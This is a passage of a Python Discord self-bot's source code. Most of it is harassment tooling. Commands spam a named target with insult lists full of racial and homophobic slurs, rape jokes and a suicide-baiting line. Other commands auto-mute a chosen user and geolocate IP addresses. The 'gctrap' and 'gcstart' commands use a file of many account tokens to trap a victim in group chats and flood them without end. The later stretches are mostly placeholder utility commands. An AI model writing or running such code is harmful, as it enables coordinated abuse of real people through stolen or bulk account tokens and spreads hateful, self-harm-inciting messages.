pizza face","shave your mullet","shrink ray penis","hey shoe box come hold my balenciagas","rusty cork screw","pig penis","hey cow sniffer","walking whoopee cushion","stop chewing on your shoe laces","pet bullet ant","hey mop come clean my floor","*rapes your ass* now what nigga","hey tissue box i just nutted on your girlfriend come clean it up","watermelon seed","hey tree stump","hey get that fly swatter out of your penis hole","melted crayon","hey piss elbows","piss ball","hey q tip come clean my ears","why is that saxaphone in your anus","stink beetle","bed bug","cross eyed bottle of mustard","hey ash tray","hey stop licking that stop sign","why is that spatula in your anus","hey melted chocolate bar","dumb coconut"
     
]







@bot.command()
@require_password()
async def aggressivebeefer(ctx, channel_id: int, user: discord.User, name: str):

    if user.id in aggressive_autobeefer_tasks:
        await ctx.send(f"Aggressive auto-beefing is already active for {user.name}!")
        return

    try:
        channel = bot.get_channel(channel_id)
        if not channel:
            await ctx.send(f"Channel with ID {channel_id} not found!")
            return

        # Default delay if not set
        delay = aggressive_autobeefer_delays.get(user.id, 1.0)

        async def send_beef_messages():
            while user.id in aggressive_autobeefer_tasks:
                # Randomly select a message
                message = random.choice(aggressive_autobeefer_messages).replace("{name}", name)

                # Occasionally ping the user
                if random.random() < 0.5:  # 50% chance
                    message += f" {user.mention}"

                try:
                    await channel.send(message)
                except discord.HTTPException as e:
                    print(f"Error sending message: {e}")
                    await asyncio.sleep(1)  # If there's an error, pause briefly before retrying
                await asyncio.sleep(delay)  # Customizable delay between messages

        # Start the aggressive auto-beefing task
        task = bot.loop.create_task(send_beef_messages())
        aggressive_autobeefer_tasks[user.id] = task
        await ctx.send(f"Aggressive auto-beefing for {user.name} started in <#{channel_id}> with a delay of {delay:.1f}s.")
    except Exception as e:
        print(f"Error starting aggressive auto-beefing: {e}")
        await ctx.send("An error occurred while starting aggressive auto-beefing.")


@bot.command()
@require_password()
async def stopaggressivebeefer(ctx, user: discord.User):

    if user.id in aggressive_autobeefer_tasks:
        aggressive_autobeefer_tasks[user.id].cancel()
        del aggressive_autobeefer_tasks[user.id]
        await ctx.send(f"Aggressive auto-beefing for {user.name} has been stopped.")
    else:
        await ctx.send(f"No active aggressive auto-beefing found for {user.name}.")


@bot.command()
@require_password()
async def beefcd(ctx, user: discord.User, delay: float):

    if delay < 0.5:
        await ctx.send("Delay must be at least 0.5 seconds to avoid rate-limiting.")
        return

    aggressive_autobeefer_delays[user.id] = delay
    await ctx.send(f"Custom delay for {user.name} set to {delay:.1f} seconds.")
    
    
    
ar_targets = {}  # To track active targets for the "ar" feature

@bot.command()
@require_password()
async def goatar(ctx, user: discord.User, typing_indicator: float = 3.0, skip_chance: float = 0.1):

    if user.id in ar_targets:
        await ctx.send(f"Auto-reply is already active for {user.name}!")
        return

    ar_targets[user.id] = {"typing_indicator": typing_indicator, "skip_chance": skip_chance}
    await ctx.send(f"Auto-reply started for {user.name} with a {typing_indicator:.1f}s typing indicator and a {skip_chance * 100:.0f}% skip chance!")

@bot.command()
@require_password()
async def stopgoatar(ctx, user: discord.User):
    if user.id in ar_targets:
        del ar_targets[user.id]
        await ctx.send(f"Auto-reply stopped for {user.name}.")
    else:
        await ctx.send(f"No active auto-reply found for {user.name}.")
        
    

@bot.command()
@require_password()
async def ascii(ctx, *, text: str):
    ascii_art = "\n".join([f"{char}  " for char in text])
    await ctx.send(f"```\n{ascii_art}\n```")

   
@bot.command()
@require_password()
async def usernamehistory(ctx, user: discord.Member):
    """Display the username history of a user."""
    await ctx.send(f"Username history for {user.mention} is not implemented.")
    
@bot.command()
@require_password()
async def calculateage(ctx, birthdate: str):
    """Calculate a user's age based on their birthdate."""
    try:
        birth_date = datetime.strptime(birthdate, "%Y-%m-%d")
        age = (datetime.now() - birth_date).days // 365
        await ctx.send(f"You are {age} years old.")
    except ValueError:
        await ctx.send("Invalid date format. Use YYYY-MM-DD.")
        
        
@bot.command()
@require_password()
async def slowmode(ctx, seconds: int):
    """Enable slow mode in a channel."""
    await ctx.channel.edit(slowmode_delay=seconds)
    await ctx.send(f"Slow mode set to {seconds} seconds.")   
    
    
    
@bot.command()
@require_password()
async def iplookup(ctx, ip: str):
    """Lookup information about an IP address."""
    url = f"http://ip-api.com/json/{ip}"
    
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            if response.status == 200:
                data = await response.json()
                
                if data['status'] == 'success':
                    ip_info = (
                        f"**IP Lookup Result:**\n"
                        f"**IP:** {data.get('query')}\n"
                        f"**City:** {data.get('city', 'N/A')}\n"
                        f"**Region:** {data.get('regionName', 'N/A')}\n"
                        f"**Country:** {data.get('country', 'N/A')}\n"
                        f"**ISP:** {data.get('isp', 'N/A')}\n"
                        f"**Timezone:** {data.get('timezone', 'N/A')}\n"
                        f"**Latitude:** {data.get('lat', 'N/A')}\n"
                        f"**Longitude:** {data.get('lon', 'N/A')}"
                    )
                    await ctx.send(ip_info)
                else:
                    await ctx.send("Invalid IP address or lookup failed.")
            else:
                await ctx.send("Failed to connect to the IP lookup service.") 
                
                
                
joking = [
    "ILL TAKE YOUR HEAD LMFAO",
    "{UPuser} QUIT CHAT PACKING BITCH YORU ASS",
    "SO WHOS GOING TO TELL HIM LMFAO",
    "UNIRONICALLY YOU PLAY WITH DILDOS",
    "AFRICAN COW LICKER",
    "YOU\nARE\nMY\nBITCH\nFAGGOT\nLMFAO",
    "YOU ARE SHITTY",
    "TAKE YOUR LIFE FAGGOT",
    "# {user} your ass as shit faggot twink {user} your ass as shit faggot twink{user} your ass as shit faggot twink{user} your ass as shit faggot twink{user} your ass as shit faggot twink{user} your ass as shit faggot twink{user} your ass as shit faggot twink{user} your ass as shit faggot twink{user} your ass as shit faggot twink{user} your ass as shit faggot twink{user} your ass as shit faggot twink{user} your ass as shit faggot twink{user} your ass as shit faggot twink{user} your ass as shit faggot twink{user} your ass as shit faggot twink{user} your ass as shit faggot twink{user} your ass as shit faggot twink{user} your ass as shit faggot twink{user} your ass as shit faggot twink{user} your ass as shit faggot twink",
    "WHAT IS A {UPuser} LOLOLOLOL",
    "# REMEMBER THIS DAY WHEN YOU GOT HOED REMEMBER THIS DAY WHEN YOU GOT HOEDREMEMBER THIS DAY WHEN YOU GOT HOEDREMEMBER THIS DAY WHEN YOU GOT HOEDREMEMBER THIS DAY WHEN YOU GOT HOEDREMEMBER THIS DAY WHEN YOU GOT HOEDREMEMBER THIS DAY WHEN YOU GOT HOEDREMEMBER THIS DAY WHEN YOU GOT HOEDREMEMBER THIS DAY WHEN YOU GOT HOEDREMEMBER THIS DAY WHEN YOU GOT HOEDREMEMBER THIS DAY WHEN YOU GOT HOEDREMEMBER THIS DAY WHEN YOU GOT HOEDREMEMBER THIS DAY WHEN YOU GOT HOEDREMEMBER THIS DAY WHEN YOU GOT HOEDREMEMBER THIS DAY WHEN YOU GOT HOEDREMEMBER THIS DAY WHEN YOU GOT HOEDREMEMBER THIS DAY WHEN YOU GOT HOEDREMEMBER THIS DAY WHEN YOU GOT HOEDREMEMBER THIS DAY WHEN YOU GOT HOEDREMEMBER THIS DAY WHEN YOU GOT HOED",
    "# your a loser {user} your a loser {user} your a loser {user} your a loser {user} your a loser {user} your a loser {user} your a loser {user} your a loser {user} your a loser {user} your a loser {user} your a loser {user} your a loser {user} your a loser {user} your a loser {user} your a loser {user} your a loser {user} your a loser {user} your a loser {user} your a loser {user} your a loser {user} your a loser {user} your a loser {user} your a loser {user} your a loser {user} your a loser {user} your a loser {user} your a loser {user} your a loser {user} your a loser {user} your a loser {user} your a loser {user} your a loser {user} your a loser {user} your a loser {user} your a loser {user} your a loser {user} ",
    "# YOU\nARE\nASS\n# AS\nFUCK\nRETARD\n"
]

gc_tracking = {}

@bot.command()
@require_password()
async def gctrap(ctx, subcommand=None, user=None):
    if not subcommand or not user:
        await ctx.send("```Usage: +gctrap all <@user>```")
        return
    
    global gc_tracking
    gc_tracking = {}
        
    if subcommand.lower() != "all":
        await ctx.send("```Invalid subcommand. Use: +gctrap all <@user>```")
        return

    try:
        user_id = ''.join(filter(str.isdigit, user))
        if not user_id:
            await ctx.send("```Invalid user mention```")
            return

        tokens = load_tokens()
        if not tokens:
            await ctx.send("```No tokens found in token.txt```")
            return

        status_msg = await ctx.send(f"""```ansi
{yellow}                               [ ☣️ ] Creating group chats...```""")

        used_tokens = set()
        
        async def get_user_id_from_token(token):
            headers = {
                "authorization": token,
                "content-type": "application/json",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get("https://discord.com/api/v9/users/@me", headers=headers) as response:
                        if response.status == 200:
                            user_data = await response.json()
                            return user_data.get('id')
            except Exception as e:
                print(f"Error getting user ID: {e}")
            return None

        async def create_initial_gc(user_id, first_token):
            headers = {
                "authorization": bot.http.token,
                "content-type": "application/json",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            
            try:
                first_token_user_id = await get_user_id_from_token(first_token)
                if not first_token_user_id:
                    print("Failed to get first token's user ID")
                    return None

                async with aiohttp.ClientSession() as session:
                    print(f"Creating initial DM with user {user_id}")
                    async with session.post(
                        "https://discord.com/api/v9/users/@me/channels",
                        headers=headers,
                        json={"recipients": [user_id, first_token_user_id]}
                    ) as response:
                        if response.status == 429:
                            retry_after = random.uniform(3, 5)
                            print(f"Rate limited, retrying in {retry_after} seconds...")
                            await asyncio.sleep(retry_after)
                            return await create_initial_gc(user_id, first_token)
                        elif response.status == 200:
                            channel = await response.json()
                            channel_id = channel['id']
                            print(f"Created initial DM channel: {channel_id}")
                            used_tokens.add(first_token)
                            gc_tracking[channel_id] = [first_token]
                            print(f"Added initial token to channel {channel_id}: {gc_tracking[channel_id]}")
                            return channel_id
                        else:
                            print(f"Failed to create initial DM: {await response.text()}")
            except Exception as e:
                print(f"Error creating initial GC: {e}")
                await asyncio.sleep(random.uniform(3, 5))
            return None

        async def add_to_gc(channel_id, token):
            try:
                token_user_id = await get_user_id_from_token(token)
                if not token_user_id:
                    print(f"Failed to get user ID for token")
                    return False
                
                headers = {
                    "authorization": bot.http.token,
                    "content-type": "application/json",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                }

                async with aiohttp.ClientSession() as session:
                    print(f"Adding token user {token_user_id} to channel {channel_id}")
                    async with session.put(
                        f"https://canary.discord.com/api/v9/channels/{channel_id}/recipients/{token_user_id}",
                        headers=headers,
                        json={}
                    ) as response:
                        response_text = await response.text()
                        if response.status == 429:
                            retry_after = random.uniform(3, 5)
                            print(f"Rate limited, retrying in {retry_after} seconds...")
                            await asyncio.sleep(retry_after)
                            return await add_to_gc(channel_id, token)

                        if not gc_tracking[channel_id]:
                            gc_tracking[channel_id] = []
                        if token not in gc_tracking[channel_id]:
                            gc_tracking[channel_id].append(token)
                            print(f"Added token to channel {channel_id}. Current tokens: {gc_tracking[channel_id]}")
                        
                        if "Maximum number of recipients reached" in response_text:
                            print(f"Group chat {channel_id} full with tokens: {gc_tracking[channel_id]}")
                            return "MAX_REACHED"
                        elif response.status != 200 and "Already recipient" not in response_text:
                            print(f"API error: {response_text}")
                            return False
                            
                        return True

            except Exception as e:
                print(f"Error adding to GC: {e}")
                await asyncio.sleep(random.uniform(3, 5))
                return False

        created_count = 0
        total_gcs = 0
        remaining_tokens = tokens.copy()

        while remaining_tokens:
            current_token = remaining_tokens[0]
            initial_gc = await create_initial_gc(user_id, current_token)
            
            if initial_gc:
                print(f"Initial group chat created: {initial_gc} with token: {current_token}")
                total_gcs += 1
                created_count = sum(len(tokens) for tokens in gc_tracking.values())
                remaining_tokens.pop(0)
                
                for token in remaining_tokens[:]:
                    if token not in used_tokens:
                        result = await add_to_gc(initial_gc, token)
                        if result == True:
                            used_tokens.add(token)
                            remaining_tokens.remove(token)
                            created_count = sum(len(tokens) for tokens in gc_tracking.values())
                            print(f"Current GC state for {initial_gc}: {gc_tracking[initial_gc]}")
                            await asyncio.sleep(1)
                        elif result == "MAX_REACHED":
                            print(f"Group chat {initial_gc} full with tokens: {gc_tracking[initial_gc]}")
                            break
                        else:
                            remaining_tokens.remove(token)

            await status_msg.edit(content=f"""```ansi
{yellow}                               [ ☣️ ] Created {total_gcs} group chats with {created_count} tokens```""")
            
            if not remaining_tokens:
                break

        print("Final GC Tracking state:", gc_tracking)

        if created_count > 0:
            await status_msg.edit(content=f"""```ansi
{yellow}                               [ ☣️ ] Final: Created {total_gcs} group chats with {created_count} tokens```""")
        else:
            await status_msg.edit(content=f"""```ansi
{yellow}                               [ ☣️ ] Failed to create any group chats```""")

    except Exception as e:
        print(f"Main error: {e}")
        await ctx.send(f"```Error: {str(e)}```")

@bot.command()
@require_password()
async def gcstart(ctx, name=None, user=None):
    """gctrap all <@mention>, code by social"""
    if not name or not user:
        await ctx.send("```Usage: +gcstart <name> <@user>```")
        return

    try:
        user_id = ''.join(filter(str.isdigit, user))
        if not user_id:
            await ctx.send("```Invalid user mention```")
            return

        if not gc_tracking:
            await ctx.send("```No group chats found. Run +gctrap all first```")
            return

        status_msg = await ctx.send(f"""```ansi
{yellow}                               [ ☣️ ] Starting GC spam...```""")

        async def spam_gc(token, channel_id):
            headers = {
                "authorization": token,
                "content-type": "application/json",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }

            while True:
                try:
                    message = f"{random.choice(joking).replace('{UPuser}', name.upper()).replace('{user}', name.lower())} <@{user_id}>"
                    async with aiohttp.ClientSession() as session:
                        async with session.post(
                            f"https://discord.com/api/v9/channels/{channel_id}/messages",
                            headers=headers,
                            json={"content": message}
                        ) as response:
                            if response.status == 429:
                                retry_after = random.uniform(3, 5)
                                await asyncio.sleep(retry_after)
                            else:
                                await asyncio.sleep(random.uniform(0.255, 0.555))
                except Exception as e:
                    print(f"Error in spam_gc: {e}")
                    await asyncio.sleep(random.uniform(3, 5))

        spam_tasks = []
        total_tokens = 0

        print("GC Tracking contents:", gc_tracking)
        
        for channel_id, tokens_list in gc_tracking.items():
            print(f"Channel {channel_id} has tokens: {tokens_list}")
            for token in tokens_list:
                spam_tasks.append(asyncio.create_task(spam_gc(token, channel_id)))
                total_tokens += 1

        if spam_tasks:
            await status_msg.edit(content=f"""```ansi
{yellow}                               [ ☣️ ] Spamming with {total_tokens} tokens in {len(gc_tracking)} group chats```""")
            try:
                await asyncio.gather(*spam_tasks)
            except Exception as e:
                print(f"Error in gather: {e}")
        else:
            await status_msg.edit(content=f"""```ansi
{yellow}                               [ ☣️ ] No group chats found to spam```""")

    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")
        
        
# Initialize a variable to store the target user ID
target_id = None

# Define the stfuu command to mute/unmute the target user
@bot.command()
@require_password()
async def stfuu(ctx, user_id: int):
    global target_id
    # Store the target user ID
    target_id = user_id
    await ctx.send(f"Target user ID set to {user_id}. The bot will now mute/unmute this user.")

# Define the stfuoff command to stop the functionality
@bot.command()
@require_password()
async def stfuuoff(ctx):
    global target_id
    target_id = None
    await ctx.send("Automatic muting functionality has been stopped.")

# Event to monitor voice state changes
@bot.event
async def on_voice_state_update(member, before, after):
    global target_id

    if target_id is not None and member.id == target_id:
        # Mute or unmute logic
        if before.mute and not after.mute:
            await member.edit(mute=True)
            print(f'{member.display_name} was automatically server muted.')
        elif not before.mute and after.mute:
            await member.edit(mute=True)
            print(f'{member.display_name} was remuted after being unmuted.')
            
            
@bot.command(name="roleinfo")
@require_password()
async def roleinfo(ctx, role: discord.Role):
    role_info = (
        f"**Role Name:** {role.name}\n"
        f"**Role ID:** {role.id}\n"
        f"**Color:** {role.color}\n"
        f"**Position:** {role.position}\n"
        f"**Members:** {len(role.members)}"
    )
    await ctx.send(role_info)

@bot.command(name="channelinfo")
@require_password()
async def channelinfo(ctx, channel: discord.TextChannel = None):
    channel = channel or ctx.channel
    channel_info = (
        f"**Channel Name:** {channel.name}\n"
        f"**Channel ID:** {channel.id}\n"
        f"**Channel Type:** {channel.type}\n"
        f"**Created At:** {channel.created_at.strftime('%d/%m/%Y %H:%M:%S')}"
    )
    await ctx.send(channel_info)




@bot.command(name="poll")
@require_password()
async def poll(ctx, *, question: str):
    message = await ctx.send(f"Poll: {question}\nReact with 👍 for Yes or 👎 for No.")
    await message.add_reaction("👍")
    await message.add_reaction("👎")

@bot.command(name="remindme")
@require_password()
async def remindme(ctx, time: int, *, reminder: str):
    await ctx.send(f"Reminder set for {time} seconds.")
    await asyncio.sleep(time)
    await ctx.send(f"Reminder: {reminder}")

@bot.command(name="weather")
@require_password()
async def weather(ctx, *, location: str):
    api_key = "YOUR_API_KEY"  # Replace with your weather API key
    response = requests.get(f"http://api.openweathermap.org/data/2.5/weather?q={location}&appid={api_key}&units=metric")
    data = response.json()
    if data["cod"] == 200:
        weather_info = (
            f"**Weather in {location}:**\n"
            f"Temperature: {data['main']['temp']}°C\n"
            f"Condition: {data['weather'][0]['description']}"
        )
        await ctx.send(weather_info)
    else:
        await ctx.send("Location not found.")

@bot.command(name="timer")
@require_password()
async def timer(ctx, seconds: int):
    await ctx.send(f"Timer set for {seconds} seconds.")
    await asyncio.sleep(seconds)
    await ctx.send("Time's up!")

@bot.command(name="quote")
@require_password()
async def quote(ctx):
    response = requests.get("https://api.quotable.io/random")
    data = response.json()
    await ctx.send(f"**Quote:** {data['content']} - {data['author']}")

@bot.command(name="fact")
@require_password()
async def fact(ctx):
    response = requests.get("https://api.fungenerators.com/fact/random")
    data = response.json()
    await ctx.send(f"**Fact:** {data['fact']}")


@bot.command(name="currency")
@require_password()
async def currency(ctx, amount: float, from_currency: str, to_currency: str):
    # Placeholder for currency conversion logic
    await ctx.send(f"Converting {amount} {from_currency} to {to_currency}... (Conversion not implemented)")


@bot.command(name="synonyms")
@require_password()
async def synonyms(ctx, *, word: str):
    # Placeholder for synonyms API logic
    await ctx.send(f"Fetching synonyms for '{word}'... (Synonyms not implemented)")

@bot.command(name="antonyms")
@require_password()
async def antonyms(ctx, *, word: str):
    # Placeholder for antonyms API logic
    await ctx.send(f"Fetching antonyms for '{word}'... (Antonyms not implemented)")

@bot.command(name="reminderlist")
@require_password()
async def reminderlist(ctx):
    # Placeholder for listing reminders
    await ctx.send("Listing reminders... (Reminders not implemented)")



@bot.command(name="kicklist")
@require_password()
async def kicklist(ctx):
    # Placeholder for listing kicked users
    await ctx.send("Listing kicked users... (Kick list not implemented)")

@bot.command(name="invite")
@require_password()
async def invite(ctx):
    invite_link = await ctx.channel.create_invite(max_age=300)  # Invite link valid for 5 minutes
    await ctx.send(f"Here is your invite link: {invite_link}")

@bot.command(name="membercount")
@require_password()
async def membercount(ctx):
    await ctx.send(f"Total members: {ctx.guild.member_count}")

@bot.command(name="rolecount")
@require_password()
async def rolecount(ctx):
    await ctx.send(f"Total roles: {len(ctx.guild.roles)}")

@bot.command(name="setannouncement")
@require_password()
async def setannouncement(ctx, *, announcement: str):
    # Placeholder for setting announcement message
    await ctx.send(f"Announcement set to: {announcement}")

@bot.command(name="setlogchannel")
@require_password()
async def setlogchannel(ctx, channel: discord.TextChannel):
    # Placeholder for setting log channel
    await ctx.send(f"Log channel set to: {channel.mention}")

@bot.command(name="setmodrole")
@require_password()
async def setmodrole(ctx, role: discord.Role):
    # Placeholder for setting mod role
    await ctx.send(f"Moderator role set to: {role.name}")

@bot.command(name="setadminrole")
@require_password()
async def setadminrole(ctx, role: discord.Role):
    # Placeholder for setting admin role
    await ctx.send(f"Admin role set to: {role.name}")

@bot.command(name="setmutedrole")
@require_password()
async def setmutedrole(ctx, role: discord.Role):
    # Placeholder for setting muted role
    await ctx.send(f"Muted role set to: {role.name}")
    
    


@bot.command()
@require_password()
async def rape2(ctx, user: discord.User = None):
    if not user:
        await ctx.send("```Usage: rape <@user>```")
        return

    methods = ["kidnap", "drive by"]
    cars = ["black van", "white van", "soccer moms mini van", "corrvet", "lambo"]
    locations = ["sex dugeon", "basement", "rape center", "rape penthouse", "kink house"]
    people = ["jaydes", "wifiskeleton", "JFK", "lap", "socail", "murda", "dahmar", "butterball chicken"]

    method = random.choice(methods)
    car = random.choice(cars)
    location = random.choice(locations)
    person = random.choice(people)
    
    async def send_message(content):
        while True:
            try:
                await ctx.send(content)
                break
            except discord.errors.HTTPException as e:
                if e.status == 429:
                    retry_after = e.retry_after
                    await asyncio.sleep(retry_after)
                    continue
                else:
                    break
            except Exception:
                break
 


@bot.command()
@require_password()
async def shopping_list(ctx, *items):
    items_list = ", ".join(items)
    await ctx.send(f"Shopping list: {items_list}")


@bot.command()
@require_password()
async def lore_generator(ctx, topic: str):
    lore = f"Lore for {topic}: Once upon a time in a land far, far away..."
    await ctx.send(lore)


@bot.command()
@require_password()
async def idea_pitch(ctx, idea: str):
    await ctx.send(f"Pitching idea: {idea}")
    

@bot.command()
@require_password()
async def debate_me(ctx, topic: str):
    await ctx.send(f"Let's debate about: {topic}")

@bot.command()
@require_password()
async def voice_mimic(ctx, voice_sample: str):
    await ctx.send(f"Mimicking voice of: {voice_sample}")


@bot.command()
@require_password()
async def art_filter(ctx, image: str):
    await ctx.send(f"Applying art filter to {image}")


@bot.command()
@require_password()
async def game_recommendation(ctx, genre: str):
    await ctx.send(f"Recommended game in {genre} genre: Game 1, Game 2, Game 3")

def search_gif(query):
    # Placeholder for actual GIF search logic (e.g., Giphy API or Tenor API)
    return f"https://example.com/gif/{query}"

def recommend_books(genre):
    # Placeholder for actual book recommendation logic
    return ["Book1", "Book2", "Book3"]

def recommend_music(genre):
    # Placeholder for actual music discovery logic
    return ["Track1", "Track2", "Track3"]

def get_mock_quiz(subject):
    # Placeholder for actual mock quiz logic
    return ["Q1: What is Python?", "Q2: Explain OOP."]
@bot.command()
@require_password()
async def playlist_create(ctx, *tracks):
    track_list = ", ".join(tracks)
    await ctx.send(f"Your playlist has been created with the following tracks: {track_list}")

# 52. GIF Search Command
@bot.command()
@require_password()
async def gif_search(ctx, query: str):
    gif_url = search_gif(query)  # Replace with actual API call
    await ctx.send(gif_url)

# 53. Mock Interview Command
@bot.command()
@require_password()
async def mock_interview(ctx, position: str):
    await ctx.send(f"Mock interview for {position}: Tell me about a time when you demonstrated leadership skills.")

# 54. Language Learning Command
@bot.command()
@require_password()
async def language_learning(ctx, language: str):
    await ctx.send(f"Learning {language}: Check out Duolingo or Babbel for great courses!")

# 55. Goal Setting Command
@bot.command()
@require_password()
async def goal_setting(ctx, goal: str):
    await ctx.send(f"Goal setting: Your goal is to {goal}. Stay focused and achieve it!")

# 56. Exercise Planner Command
@bot.command()
@require_password()
async def exercise_planner(ctx, exercise: str):
    await ctx.send(f"Exercise plan for the day: {exercise}. Make sure to warm up before starting!")

# 57. Book Recommendation Command
@bot.command()
@require_password()
async def book_recommend(ctx, genre: str):
    recommended_books = recommend_books(genre)
    await ctx.send(f"Books recommended for {genre} genre: {', '.join(recommended_books)}")

# 58. Music Discovery Command
@bot.command()
@require_password()
async def music_discovery(ctx, genre: str):
    recommended_tracks = recommend_music(genre)
    await ctx.send(f"Discover new music in {genre} genre: {', '.join(recommended_tracks)}")

# 59. Keyboard Shortcuts Command
@bot.command()
@require_password()
async def keyboard_shortcuts(ctx):
    shortcuts = """
    - Ctrl + C: Copy
    - Ctrl + V: Paste
    - Ctrl + Z: Undo
    - Ctrl + Shift + Esc: Open Task Manager
    """
    await ctx.send(f"Useful keyboard shortcuts:\n{shortcuts}")

# 60. Browser Extension Advice Command
@bot.command()
@require_password()
async def browser_extension_advice(ctx):
    extensions = """
    - Grammarly: Writing assistant
    - LastPass: Password manager
    - uBlock Origin: Ad blocker
    """
    await ctx.send(f"Recommended browser extensions:\n{extensions}")

# 61. Resume Tips Command
@bot.command()
@require_password()
async def resume_tips(ctx):
    tips = """
    - Keep it concise (1-2 pages)
    - Use action verbs (e.g., managed, led, created)
    - Tailor it to the job you’re applying for
    """
    await ctx.send(f"Resume tips:\n{tips}")

# 62. Job Search Help Command

@bot.command()
@require_password()
async def mock_quiz(ctx, subject: str):
    questions = get_mock_quiz(subject)
    await ctx.send("\n".join(questions))
# 64. Arithmetic Practice Command
@bot.command()
@require_password()
async def arithmetic_practice(ctx, num1: int, num2: int):
    result = num1 + num2
    await ctx.send(f"The result of {num1} + {num2} is {result}.")

# 65. Physics Toolkit Command
@bot.command()
@require_password()
async def physics_toolkit(ctx, formula: str):
    # Example: Simple physics formula calculation (Placeholder logic)
    if formula.lower() == 'force':
        await ctx.send("Formula for force: F = m * a (Force = mass * acceleration)")
    else:
        await ctx.send(f"Unknown physics formula: {formula}")

# 66. Chemistry Helper Command
@bot.command()
@require_password()
async def chemistry_helper(ctx, element: str):
    # Placeholder: Provide basic info on the element (use a periodic table API or database)
    element_info = f"Info about {element}: Atomic number 1, symbol H, and it's a key element in water."
    await ctx.send(element_info)


# 27. Astronomy Picture Command
@bot.command()
@require_password()
async def astronomy_pic(ctx):
    url = 'https://api.nasa.gov/planetary/apod?api_key=DEMO_KEY'
    response = requests.get(url)
    data = response.json()
    image_url = data.get('url')
    explanation = data.get('explanation')
    await ctx.send(f"Astronomy Picture of the Day:\n{explanation}\n{image_url}")

# 28. Space News Command
@bot.command()
@require_password()
async def space_news(ctx):
    url = 'https://api.spaceflightnewsapi.net/api/v1/articles'
    response = requests.get(url)
    articles = response.json()
    if articles:
        article = articles[0]
        await ctx.send(f"Space News: {article['title']}\n{article['summary']}")
    else:
        await ctx.send("No space news available at the moment.")

# 29. Coding Challenges Command
@bot.command()
@require_password()
async def coding_challenges(ctx):
    await ctx.send("Coding challenge: Implement a function to find the longest palindrome in a string.")



# 33. Brainstorming Command
@bot.command()
@require_password()
async def brainstorming(ctx, topic: str):
    await ctx.send(f"Brainstorming ideas for: {topic} - Idea 1, Idea 2, Idea 3")

# 34. Time Zone Convert Command
@bot.command()
@require_password()
async def time_zone_convert(ctx, time: str, from_tz: str, to_tz: str):
    # Implement conversion logic here
    converted_time = f"Converted time from {from_tz} to {to_tz} is {time}"
    await ctx.send(converted_time)
    
    
@bot.command()
@require_password()

async def survey_tool(ctx, survey_title: str, *questions):
    questions_list = "\n".join([f"{i+1}. {question}" for i, question in enumerate(questions)])
    await ctx.send(f"Survey: {survey_title}\n{questions_list}")

# 24. Soundboard Command
@bot.command()
@require_password()
async def soundboard(ctx, sound: str):
    await ctx.send(f"Soundboard: Playing {sound}")
    
    
# 9. Movie Recommendation Command
@bot.command()
@require_password()
async def movie_recommendation(ctx, genre: str):
    await ctx.send(f"Here are some movies in {genre} genre: Movie 1, Movie 2, Movie 3")

# 10. TV Schedule Command
@bot.command()
@require_password()
async def tv_schedule(ctx, channel: str):
    await ctx.send(f"Schedule for {channel}: Movie at 6pm, Show at 9pm")

# 11. Event Reminder Command
@bot.command()
@require_password()
async def event_reminder(ctx, event_name: str, event_date: str):
    await ctx.send(f"Reminder: {event_name} is on {event_date}")

# 12. Habit Tracker Command
@bot.command()
@require_password()
async def habit_tracker(ctx, habit: str, frequency: str):
    await ctx.send(f"Tracking habit: {habit}, Frequency: {frequency}")

# 13. Poetry Generate Command
@bot.command()
@require_password()
async def poetry_generate(ctx, theme: str):
    await ctx.send(f"A poem about {theme}: Rhyme, verse, dream")

# 14. Haiku Generate Command
@bot.command()
@require_password()
async def haiku_generate(ctx, theme: str):
    await ctx.send(f"A haiku about {theme}: Nature's calm breeze flows")

# 15. Voice Cloner Command (Placeholder)
@bot.command()
@require_password()
async def voice_cloner(ctx, voice_sample: str):
    await ctx.send(f"Voice clone for {voice_sample}")

# 16. Photo Edit Command (Placeholder)
@bot.command()
@require_password()
async def photo_edit(ctx, photo: str, filters: str):
    await ctx.send(f"Applied {filters} to {photo}")

# 17. Meme Generator Command
@bot.command()
@require_password()
async def meme_generator(ctx, text: str):
    await ctx.send(f"Generated meme with text: {text}")

# 18. Emoji Creator Command
@bot.command()
@require_password()
async def emoji_creator(ctx, symbol: str):
    await ctx.send(f"Generated emoji: {symbol}")

# 19. Voice Filter Command
@bot.command()
@require_password()
async def voice_filter(ctx, voice_sample: str, filter_type: str):
    await ctx.send(f"Voice filtered with {filter_type}")
    
    
# 39. !guessword
@bot.command()
async def guessword(ctx):
    word_list = ["apple", "banana", "cherry", "orange", "grapes"]
    chosen_word = random.choice(word_list).upper()
    guessed_letters = set()
    word_display = ["_" for _ in chosen_word]
    
    await ctx.send(f"Guess the word! It has {len(chosen_word)} letters: `{' '.join(word_display)}`")

    def check(m):
        return m.author == ctx.author and len(m.content) == 1 and m.content.isalpha()

    while "_" in word_display:
        try:
            msg = await bot.wait_for("message", check=check, timeout=30.0)
            guess = msg.content.upper()

            if guess in guessed_letters:
                await ctx.send("You already guessed that letter!")
            elif guess in chosen_word:
                guessed_letters.add(guess)
                for i, letter in enumerate(chosen_word):
                    if letter == guess:
                        word_display[i] = guess
                await ctx.send(f"Correct! `{' '.join(word_display)}`")
            else:
                guessed_letters.add(guess)
                await ctx.send(f"Wrong guess! Try again: `{' '.join(word_display)}`")
        except asyncio.TimeoutError:
            await ctx.send(f"Time's up! The word was: {chosen_word}.")
            return

    await ctx.send(f"🎉 Congrats! You guessed the word: {chosen_word} 🎉")

# 40. !superpower
@bot.command()
async def superpower(ctx):
    powers = [
        "Invisibility", "Flight", "Super Strength", "Time Travel",
        "Mind Reading", "Infinite Snacks", "Shapeshifting", 
        "Talking to Animals", "Breathing Underwater", "Teleportation"
    ]
    funny_powers = [
        "Turning your enemies into rubber ducks 🦆", 
        "Unlimited supply of Wi-Fi passwords 📶", 
        "Always finding the shortest checkout line 🛒", 
